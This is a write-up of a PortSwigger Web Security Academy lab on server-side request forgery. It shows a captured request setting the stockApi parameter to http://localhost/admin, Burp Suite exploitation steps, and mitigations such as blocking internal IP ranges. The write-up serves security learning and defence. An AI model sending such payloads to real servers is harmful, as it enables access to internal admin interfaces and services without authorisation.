# 📘 Scenario 1: SSRF to Access Internal Resources via `localhost`

## 🔎 Vulnerability Description

In this scenario, the web application provides a feature to check product stock by making a server-side request via a parameter called `stockAPI`. However, it fails to validate or restrict the input, making it vulnerable to Server-Side Request Forgery (SSRF).

> **Vulnerability Type:** Input Validation  
> **OWASP ID:** A10:2021 – SSRF  
> **Risk Level:** Medium  

---

## 🔧 Target Link
**URL:**
🔗 https://0ae0004b0408113f8332ce8e00a6008c.web-securityacademy.net/product/stock

---

## 📥 HTTP Request

```http
POST /product/stock HTTP/2
Host: 0ae0004b0408113f8332ce8e00a6008c.web-security-academy.net
Cookie: session=RVT6kuMP2cTfbZBCaZkJZDYjfro1m6K8
Content-Length: 31
Sec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0ae0004b0408113f8332ce8e00a6008c.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ae0004b0408113f8332ce8e00a6008c.web-securityacademy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
stockApi=http://localhost/admin
```
---
## 📥 Server Response
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Set-Cookie: session=I4iONnYtSO3P6la1YQwMakzkd2gBpOt0; Secure; HttpOnly;
SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 3070
```
---

## 🧪 Exploitation Steps

Open Burp Suite and intercept the request to `/product/stock`.

Modify the `stockApi` parameter to target an internal host:
```
stockApi=http://localhost/admin
```
Forward the request and analyze the response.

If successful, the server responds with internal data not normally exposed to users.

## 💥 Potential Impact

- Exposes internal systems or management interfaces.

- May lead to information disclosure or privilege escalation.

- Can serve as a pivot point to attack internal services (e.g., metadata servers, Redis, etc.).

## ✅ Mitigation Suggestions
Do not trust user-supplied URLs for server-side requests.

Implement allowlists of safe domains/IPs for outbound requests.

Block internal ranges such as:

`127.0.0.0/8` (localhost)

`10.0.0.0/8`, `192.168.0.0/16` (private networks)

`169.254.0.0/16` (link-local)

Sanitize all URL input and ensure redirects are not blindly followed.

Use a proxy layer or SSRF-aware firewall to filter requests.

## 📸 Screenshot

![Exploitation Image Of Scenario 1](https://github.com/hovikhanh/ssrf-demo/images/Picture1.png "Exploitation Image Of Scenario 1")

## 🔗 References

[OWASP SSRF Guide](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)

[PortSwigger Web Security Academy – SSRF Labs](https://portswigger.net/web-security/ssrf)